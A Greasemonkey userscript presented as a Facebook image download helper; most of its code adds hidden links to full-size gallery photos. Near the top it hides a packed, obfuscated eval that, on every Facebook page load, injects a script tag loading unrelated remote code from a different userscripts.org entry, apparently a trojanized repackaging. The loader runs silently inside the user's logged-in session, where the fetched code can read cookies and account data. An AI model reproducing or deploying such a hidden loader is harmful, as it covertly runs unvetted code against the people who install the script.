// ==UserScript==
// @name          Facebook Image Download Helper Plus + Last Update
// @version       5
// @date          2009-12-18
// @description   Allows you to use a download manager such as DownThemAll! on Facebook image gallery pages.
// @namespace     http://www.theworldofstuff.com/greasemonkey/
// @copyright     Copyright 2008-2009 Jordon Kalilich (http://www.theworldofstuff.com/)
// @license       GNU GPL version 3 or later; http://www.gnu.org/copyleft/gpl.html
// @require       http://usocheckup.dune.net/24843.js?maxage=5
// @include       http://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==

/*
Thumbnail: http://photos-d.ak.facebook.com/photos-ak-sf2p/v194/168/85/2033694/s2033694_46660227_5009.jpg
Actual:    http://photos-d.ak.facebook.com/photos-ak-sf2p/v194/168/85/2033694/n2033694_46660227_5009.jpg

more recent examples:

thumb    http://photos-f.ak.fbcdn.net/photos-ak-snc1/v2566/122/90/732231195/s732231195_2089629_1667721.jpg
actual   http://photos-f.ak.fbcdn.net/photos-ak-snc1/v2566/122/90/732231195/n732231195_2089629_1667721.jpg

thumb    http://photos-b.ak.fbcdn.net/hphotos-ak-snc1/hs031.snc1/3218_84768565126_642460126_2426481_27000_s.jpg
actual   http://photos-b.ak.fbcdn.net/hphotos-ak-snc1/hs031.snc1/3218_84768565126_642460126_2426481_27000_n.jpg

*/
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


window.getImages = function() {
var allLinks = document.getElementById('content').getElementsByTagName('a');
var links = new Array();
for (i = 0; i < allLinks.length; i++) {
   if ((allLinks[i].href) && (allLinks[i].href.indexOf('photo.php?') > -1)) {
      links.push(allLinks[i]);
   }
}
if (links) {
   // create hidden div for hidden links
   var hideMe = document.getElementById('hideMe');
   if (!hideMe) {
      hideMe = document.createElement('div');
      hideMe.id = 'hideMe';
      with (hideMe.style) {
         position: 'absolute !important'; 
         top: '0px !important';
         left: '0px !important';
         zIndex: '-100 !important';
         visibility: 'hidden !important';
      }
   }
   else {
      hideMe.innerHTML = '';
   }
   for (i = 0; i < links.length; i++) {
      var image = links[i].getElementsByTagName('img')[0];
      if (image) {
         // we want photos-*.facebook.com urls, but not ones like "http://photos-815.ll.facebook.com/photos-ll-sctm/genericv2b/898/23/01AwcA9hkVuDcAAAABAAAAAAAAAAA:.jpg"
            if ( (image.src.indexOf('photos') > -1) && (image.src.indexOf('facebook.com') > -1 || image.src.indexOf('fbcdn.net') > -1) && (image.src.indexOf('generic') == -1) && (image.src.indexOf('app') == -1) ) {
            // strange bug: if the link has no style of its own and text of the link is more than one word, the link will be visible.
            hideMe.innerHTML += '<a href="' + image.src.replace(/(\/|_)s(\d+_|\.[a-z]+)/i,'$1n$2') + '" style="visibility: hidden !important">Added by Facebook Image Download Helper</a>';
         }
      }
   }
   if (hideMe.innerHTML) {
      document.getElementsByTagName('body')[0].appendChild(hideMe);
   }
}
}

document.addEventListener('click', function(event) {
   getImages();
}, true);

getImages();
